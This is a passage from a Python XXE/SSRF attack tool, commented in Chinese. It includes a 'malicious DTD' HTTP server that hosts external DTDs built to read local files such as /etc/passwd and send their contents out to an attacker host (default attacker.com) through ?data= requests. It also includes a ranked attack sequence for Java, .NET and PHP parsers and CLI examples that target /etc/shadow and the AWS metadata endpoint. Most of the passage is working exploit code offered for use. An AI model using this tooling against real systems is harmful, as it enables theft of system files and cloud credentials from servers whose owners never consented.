            "oob_classic": [self.generate_oob_classic_payload()],
        }

        if self.platform == "java":
            results["java_specific"] = self.generate_java_specific_payload()

        results["xslt"] = self.generate_xslt_payload()

        return results


# ============================================================================
# 第三部分：恶意 DTD HTTP 服务器
# ============================================================================

class MaliciousDTDHandler(SimpleHTTPRequestHandler):
    """
    恶意 DTD 文件 HTTP 服务器
    
    用于托管 Error-Based XXE 所需的外部 DTD 文件。
    启动后会在指定端口提供:
      /evil.dtd         - Error-Based 攻击 DTD
      /oob.dtd          - 经典 OOB 攻击 DTD (仅 PHP)
      /evil_base64.dtd  - Base64 编码版 (仅 PHP)
    
    同时记录所有传入请求 (用于 OOB 数据接收)。
    """

    target_file = "/etc/passwd"  # 类级别默认值

    def do_GET(self):
        # 记录请求 (可能包含 OOB 外带的数据)
        print(f"\n{'='*60}")
        print(f"[+] 收到请求: {self.path}")
        print(f"    来源: {self.client_address[0]}:{self.client_address[1]}")
        print(f"    User-Agent: {self.headers.get('User-Agent', 'N/A')}")

        # 检查是否包含外带数据
        if '?data=' in self.path or '?d=' in self.path:
            data_part = self.path.split('?data=')[-1] if '?data=' in self.path else self.path.split('?d=')[-1]
            print(f"    [!!!] 外带数据: {data_part}")

        print(f"{'='*60}\n")

        if self.path == '/evil.dtd':
            content = self._get_error_based_dtd()
        elif self.path == '/oob.dtd':
            content = self._get_oob_dtd()
        elif self.path == '/evil_base64.dtd':
            content = self._get_base64_dtd()
        else:
            # 对于任何其他路径，返回空响应但记录请求
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'OK')
            return

        self.send_response(200)
        self.send_header('Content-Type', 'application/xml-dtd')
        self.send_header('Content-Length', str(len(content)))
        self.end_headers()
        self.wfile.write(content.encode())

    def _get_error_based_dtd(self) -> str:
        """Error-Based DTD: 合规解析器可用"""
        return (
            f'<!ENTITY % file SYSTEM "file://{self.target_file}">\n'
            f'<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '
            f'\'file:///nonexistent_xxe/&#x25;file;\'>">\n'
            f'%eval;\n'
            f'%error;\n'
        )

    def _get_oob_dtd(self) -> str:
        """OOB DTD: 仅 PHP/libxml2 有效"""
        server_host = self.headers.get('Host', 'attacker.com')
        return (
            f'<!ENTITY % file SYSTEM "file://{self.target_file}">\n'
            f'<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '
            f'\'http://{server_host}/?data=&#x25;file;\'>">\n'
            f'%eval;\n'
            f'%exfil;\n'
        )

    def _get_base64_dtd(self) -> str:
        """Base64 编码 DTD: 仅 PHP 有效 (使用 php://filter)"""
        server_host = self.headers.get('Host', 'attacker.com')
        return (
            f'<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={self.target_file}">\n'
            f'<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '
            f'\'http://{server_host}/?data=&#x25;file;\'>">\n'
            f'%eval;\n'
            f'%exfil;\n'
        )

    def log_message(self, format, *args):
        """覆盖默认日志格式"""
        pass  # 我们在 do_GET 中自定义了日志输出


def start_dtd_server(port: int, target_file: str):
    """
    启动恶意 DTD HTTP 服务器
    
    Args:
        port: 监听端口
        target_file: DTD 中要读取的目标文件路径
    """
    MaliciousDTDHandler.target_file = target_file
    server = HTTPServer(('0.0.0.0', port), MaliciousDTDHandler)
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║          XXE 恶意 DTD 服务器已启动                           ║
╠══════════════════════════════════════════════════════════════╣
║  监听地址:  0.0.0.0:{port:<5}                                  ║
║  目标文件:  {target_file:<47} ║
║                                                              ║
║  提供的 DTD 端点:                                            ║
║    /evil.dtd        - Error-Based (Java/.NET 合规解析器)     ║
║    /oob.dtd         - OOB 经典外带 (仅 PHP/libxml2)         ║
║    /evil_base64.dtd - Base64 编码 (仅 PHP)                   ║
║                                                              ║
║  所有传入请求都会被记录 (含外带数据捕获)                     ║
║  按 Ctrl+C 停止服务器                                       ║
╚══════════════════════════════════════════════════════════════╝
""")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] 服务器已停止")
        server.server_close()


# ============================================================================
# 第四部分：自动化探测辅助
# ============================================================================

class XXEProbeHelper:
    """
    XXE 探测辅助类
    
    提供以下辅助功能：
    - 根据目标环境自动推荐最佳攻击路线
    - 生成逐步测试的 payload 序列
    - 输出格式化的测试报告
    """

    @staticmethod
    def get_detection_sequence(platform: str, target_os: str) -> List[str]:
        """
        获取推荐的探测顺序
        
        策略:
        1. 先用 DNS canary 确认 XXE 是否存在
        2. 尝试 Blind SSRF (最低门槛)
        3. 尝试 Local DTD Reuse (不需出网)
        4. 尝试 Error-Based (需出网)
        5. 尝试 XInclude (特定场景)
        6. 尝试 Schema SSRF (需 Schema 验证)
        """
        sequence = [
            "blind_ssrf_dns_canary",      # 第一步: 确认漏洞
            "blind_ssrf_doctype_system",   # 第二步: 简单 SSRF
            "blind_ssrf_parameter_entity", # 第三步: 参数实体 SSRF
        ]

        if platform == "java":
            if target_os == "linux":
                sequence.extend([
                    "local_dtd_reuse_ISOamso",  # Yelp DTD
                    "local_dtd_reuse_URI",      # Tomcat JSP DTD
                    "local_dtd_reuse_expr",     # Fontconfig DTD
                ])
            else:
                sequence.extend([
                    "local_dtd_reuse_CIMName",  # Windows WMI DTD
                ])
            sequence.append("java_jar_ssrf")
            sequence.append("java_jar_timing")

        elif platform == "dotnet":
            if target_os == "windows":
                sequence.extend([
                    "local_dtd_reuse_CIMName",  # Windows WMI DTD
                ])

        sequence.extend([
            "error_based_external_dtd",
            "xinclude_file_read",
            "schema_ssrf_no_namespace",
        ])

        return sequence

    @staticmethod
    def generate_report(results: Dict) -> str:
        """生成格式化的 payload 测试报告"""
        report_lines = []
        report_lines.append("=" * 70)
        report_lines.append("          XXE/SSRF Payload 生成报告")
        report_lines.append("=" * 70)

        total_count = 0
        for category, payloads in results.items():
            if not payloads:
                continue
            report_lines.append(f"\n{'─' * 70}")
            report_lines.append(f"  [{category.upper()}] - 共 {len(payloads)} 个 payload")
            report_lines.append(f"{'─' * 70}")

            for i, p in enumerate(payloads, 1):
                total_count += 1
                name = p.get("name", "unnamed")
                technique = p.get("technique", "N/A")
                desc = p.get("description", "")
                confidence = p.get("confidence", "")

                report_lines.append(f"\n  [{i}] {name}")
                report_lines.append(f"      技术: {technique}")
                if confidence:
                    report_lines.append(f"      可信度: {confidence}")
                report_lines.append(f"      说明: {desc}")

                # 显示解析器支持情况
                support = p.get("parser_support", {})
                if support:
                    report_lines.append(f"      解析器兼容性:")
                    for parser, status in support.items():
                        report_lines.append(f"        - {parser}: {status}")

                # 显示前提条件
                reqs = p.get("requirements", [])
                if reqs:
                    report_lines.append(f"      前提条件:")
                    for r in reqs:
                        report_lines.append(f"        • {r}")

                # 显示 payload 预览 (截断)
                payload = p.get("payload", "")
                if payload:
                    preview = payload[:200] + "..." if len(payload) > 200 else payload
                    report_lines.append(f"      Payload 预览:")
                    for line in preview.split('\n'):
                        report_lines.append(f"        {line}")

        report_lines.append(f"\n{'=' * 70}")
        report_lines.append(f"  总计生成 {total_count} 个 payload")
        report_lines.append(f"{'=' * 70}")

        return '\n'.join(report_lines)


# ============================================================================
# 第五部分：Payload 输出与保存
# ============================================================================

def save_payloads_to_files(results: Dict, output_dir: str = "./xxe_payloads"):
    """
    将所有生成的 payload 保存到文件
    
    目录结构:
    xxe_payloads/
    ├── local_dtd/
    │   ├── 01_local_dtd_reuse_ISOamso.xml
    │   ├── 02_local_dtd_reuse_URI.xml
    │   └── ...
    ├── error_based/
    │   ├── payload.xml
    │   └── evil.dtd
    ├── blind_ssrf/
    │   ├── 01_blind_ssrf_parameter_entity.xml
    │   └── ...
    ├── xinclude/
    │   └── ...
    ├── schema_ssrf/
    │   └── ...
    ├── java_specific/
    │   └── ...
    ├── xslt/
    │   └── ...
    └── report.txt
    """
    os.makedirs(output_dir, exist_ok=True)

    for category, payloads in results.items():
        if not payloads:
            continue
        cat_dir = os.path.join(output_dir, category)
        os.makedirs(cat_dir, exist_ok=True)

        for i, p in enumerate(payloads, 1):
            name = p.get("name", f"payload_{i}")
            payload = p.get("payload", "")

            # 保存主 payload
            filename = f"{i:02d}_{name}.xml"
            filepath = os.path.join(cat_dir, filename)
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(payload)

            # 如果有关联的 evil.dtd，也保存
            evil_dtd = p.get("evil_dtd", "")
            if evil_dtd:
                dtd_path = os.path.join(cat_dir, f"{i:02d}_{name}_evil.dtd")
                with open(dtd_path, 'w', encoding='utf-8') as f:
                    f.write(evil_dtd)

            # 如果有注入片段 (XInclude)，单独保存
            fragment = p.get("injection_fragment", "")
            if fragment:
                frag_path = os.path.join(cat_dir, f"{i:02d}_{name}_fragment.txt")
                with open(frag_path, 'w', encoding='utf-8') as f:
                    f.write(fragment)

    # 保存报告
    report = XXEProbeHelper.generate_report(results)
    report_path = os.path.join(output_dir, "report.txt")
    with open(report_path, 'w', encoding='utf-8') as f:
        f.write(report)

    print(f"[+] Payload 已保存到: {output_dir}/")
    print(f"[+] 报告已保存到: {report_path}")


# ============================================================================
# 第六部分：主程序入口
# ============================================================================

def print_banner():
    banner = """
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║     ██╗  ██╗██╗  ██╗███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗  ║
║     ╚██╗██╔╝╚██╗██╔╝██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║  ║
║      ╚███╔╝  ╚███╔╝ █████╗      ███████╗██║     ███████║██╔██╗ ██║  ║
║      ██╔██╗  ██╔██╗ ██╔══╝      ╚════██║██║     ██╔══██║██║╚██╗██║  ║
║     ██╔╝ ██╗██╔╝ ██╗███████╗    ███████║╚██████╗██║  ██║██║ ╚████║  ║
║     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝  ║
║                                                                      ║
║     XXE/SSRF 漏洞探测工具 - 支持 Java/.NET 合规解析器               ║
║     支持: Local DTD Reuse | Error-Based | Blind SSRF | XInclude      ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
"""
    print(banner)


def list_available_modes():
    """列出所有可用的生成模式"""
    modes = """
┌────────────────────────────────────────────────────────────────────────┐
│  可用模式 (--mode)                                                      │
├──────────────┬─────────────────────────────────────────────────────────┤
│  local_dtd   │ Local DTD Reuse - 无需出网，最推荐 (Java/.NET)          │
│  error_based │ Error-Based XXE - 需出网+错误回显                       │
│  blind_ssrf  │ Blind SSRF - 仅触发请求，适合探测/打内网                │
│  xinclude    │ XInclude 注入 - 不需 DOCTYPE，注入 XML body             │
│  schema_ssrf │ Schema Location SSRF - 通过 XSD 验证触发                │
│  java_proto  │ Java 特有协议 (jar://, netdoc://, gopher://)            │
│  xslt        │ XSLT 注入 - 文件读取/SSRF/RCE                          │
│  oob_classic │ 经典 OOB 外带 - 仅对 PHP/libxml2 有效                   │
│  auto        │ 自动模式 - 生成所有适用 payload 并保存到文件             │
├──────────────┼─────────────────────────────────────────────────────────┤
│  --serve     │ 启动恶意 DTD HTTP 服务器 (配合 error_based 使用)         │
│  --list      │ 显示此帮助信息                                          │
└──────────────┴─────────────────────────────────────────────────────────┘

目标平台 (--platform):
  java    - Java (Xerces/SAX/DOM/JAXB) [默认]
  dotnet  - .NET (XmlReader/XmlDocument/XDocument)
  php     - PHP (libxml2/SimpleXML/DOMDocument)

目标系统 (--os):
  linux   - Linux/Unix [默认]
  windows - Windows
"""
    print(modes)


def main():
    print_banner()

    parser = argparse.ArgumentParser(
        description="XXE/SSRF 漏洞探测工具 - 支持 Java/.NET 合规解析器",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""
示例:
  %(prog)s --mode local_dtd --target-file /etc/passwd --os linux --platform java
  %(prog)s --mode error_based --attacker-url http://10.0.0.1:8080 --target-file /etc/shadow
  %(prog)s --mode blind_ssrf --ssrf-url http://169.254.169.254/latest/meta-data/
  %(prog)s --mode auto --attacker-url http://attacker.com --os linux -o ./payloads
  %(prog)s --serve --port 8080 --target-file /etc/passwd
        """)
    )

    parser.add_argument('--mode', '-m',
                        choices=['local_dtd', 'error_based', 'blind_ssrf',
                                 'xinclude', 'schema_ssrf', 'java_proto',
                                 'xslt', 'oob_classic', 'auto'],
                        help='Payload 生成模式')
    parser.add_argument('--list', '-l', action='store_true',
                        help='列出所有可用模式')
    parser.add_argument('--platform', '-p', default='java',
                        choices=['java', 'dotnet', 'php'],
                        help='目标平台 (默认: java)')
    parser.add_argument('--os', default='linux',
                        choices=['linux', 'windows'],
                        help='目标操作系统 (默认: linux)')
    parser.add_argument('--target-file', '-f', default='/etc/passwd',
                        help='要读取的目标文件 (默认: /etc/passwd)')
    parser.add_argument('--attacker-url', '-a', default='http://attacker.com',
                        help='攻击者服务器地址 (默认: http://attacker.com)')
    parser.add_argument('--ssrf-url', '-s',
                        default='http://169.254.169.254/latest/meta-data/',
                        help='SSRF 目标 URL (默认: AWS 元数据端点)')
    parser.add_argument('--output', '-o', default='./xxe_payloads',
                        help='Payload 输出目录 (默认: ./xxe_payloads)')
    parser.add_argument('--serve', action='store_true',
                        help='启动恶意 DTD HTTP 服务器')
    parser.add_argument('--port', type=int, default=8080,
                        help='DTD 服务器端口 (默认: 8080)')
    parser.add_argument('--json', action='store_true',
                        help='以 JSON 格式输出 payload')

    args = parser.parse_args()

    # 显示帮助
    if args.list:
        list_available_modes()
        return

    # 启动 DTD 服务器
    if args.serve:
        start_dtd_server(args.port, args.target_file)
        return

    # 必须指定模式
    if not args.mode:
        parser.print_help()
        print("\n[!] 请指定 --mode 或使用 --list 查看可用模式")
        return

    # 初始化生成器
    generator = XXEPayloadGenerator(
        target_file=args.target_file,
        attacker_url=args.attacker_url,
        ssrf_url=args.ssrf_url,
        target_os=args.os,
        platform=args.platform
    )

    # 按模式生成 payload
    if args.mode == 'auto':
        results = generator.generate_all_payloads()
        if args.json:
            # JSON 输出模式
            json_output = {}
            for category, payloads in results.items():
                json_output[category] = []
                for p in payloads:
                    json_output[category].append({
                        "name": p.get("name"),
                        "payload": p.get("payload"),
                        "evil_dtd": p.get("evil_dtd", None),
                        "technique": p.get("technique"),
                    })
            print(json.dumps(json_output, ensure_ascii=False, indent=2))
        else:
            # 保存到文件 + 打印报告
            save_payloads_to_files(results, args.output)
            print(XXEProbeHelper.generate_report(results))
            print(f"\n[*] 推荐探测顺序 ({args.platform}/{args.os}):")
            sequence = XXEProbeHelper.get_detection_sequence(args.platform, args.os)
            for i, step in enumerate(sequence, 1):
                print(f"    {i}. {step}")
        return

    # 单模式生成
    if args.mode == 'local_dtd':
        payloads = generator.generate_local_dtd_payload()
    elif args.mode == 'error_based':
        payloads = [generator.generate_error_based_payload()]
    elif args.mode == 'blind_ssrf':
        payloads = generator.generate_blind_ssrf_payload()
    elif args.mode == 'xinclude':
        payloads = generator.generate_xinclude_payload()
    elif args.mode == 'schema_ssrf':
        payloads = generator.generate_schema_ssrf_payload()
    elif args.mode == 'java_proto':
        payloads = generator.generate_java_specific_payload()
    elif args.mode == 'xslt':
        payloads = generator.generate_xslt_payload()
    elif args.mode == 'oob_classic':
        payloads = [generator.generate_oob_classic_payload()]
    else:
        print(f"[!] 未知模式: {args.mode}")
        return

    # 输出结果
    if not payloads:
        print(f"[!] 未找到适用于 {args.platform}/{args.os} 的 {args.mode} payload")
        return

    if args.json:
        json_output = []
        for p in payloads:
            json_output.append({
                "name": p.get("name"),
                "payload": p.get("payload"),
                "evil_dtd": p.get("evil_dtd", None),
                "injection_fragment": p.get("injection_fragment", None),
                "technique": p.get("technique"),
                "requirements": p.get("requirements", []),
            })
        print(json.dumps(json_output, ensure_ascii=False, indent=2))
    else:
        print(f"\n[+] 模式: {args.mode} | 平台: {args.platform} | 系统: {args.os}")
        print(f"[+] 目标文件: {args.target_file}")
        print(f"[+] 生成 {len(payloads)} 个 payload:\n")

        for i, p in enumerate(payloads, 1):
            print(f"{'━' * 70}")
            print(f"  Payload #{i}: {p.get('name', 'unnamed')}")
            print(f"  技术: {p.get('technique', 'N/A')}")
            print(f"  说明: {p.get('description', '')}")

            # 警告信息
            warning = p.get("warning", "")
            if warning:
                print(f"  ⚠️  {warning}")

            # 置信度
            confidence = p.get("confidence", "")
            if confidence:
                print(f"  可信度: {confidence}")

            print(f"\n  --- XML Payload ---")
            print(textwrap.indent(p.get("payload", ""), "  "))

            # 外部 DTD
            evil_dtd = p.get("evil_dtd", "")
            if evil_dtd:
                print(f"\n  --- 需要托管的 evil.dtd ---")
                print(textwrap.indent(evil_dtd, "  "))

            # 注入片段
            fragment = p.get("injection_fragment", "")
            if fragment:
                print(f"\n  --- 注入片段 (用于嵌入 XML body) ---")
                print(textwrap.indent(fragment, "  "))

            # 前提条件
            reqs = p.get("requirements", [])
            if reqs:
                print(f"\n  前提条件:")
                for r in reqs:
                    print(f"    • {r}")

            # 解析器支持
            support = p.get("parser_support", {})
            if support:
                print(f"\n  解析器兼容性:")
                for parser_name, status in support.items():
                    print(f"    {parser_name}: {status}")

            print()

        # 额外操作提示
        if args.mode == 'error_based':
            print(f"\n{'━' * 70}")
            print(f"  [提示] 使用以下命令启动 DTD 服务器:")
            print(f"    python {sys.argv[0]} --serve --port 8080 --target-file {args.target_file}")
            print(f"  然后将 --attacker-url 设为你的服务器地址")

        if args.mode == 'local_dtd' and not payloads:
            print(f"\n  [提示] 未找到适用的本地 DTD。可以尝试:")
            print(f"    1. 切换 --os 参数 (linux/windows)")
            print(f"    2. 手动指定已知的 DTD 路径")


if __name__ == '__main__':
    main()
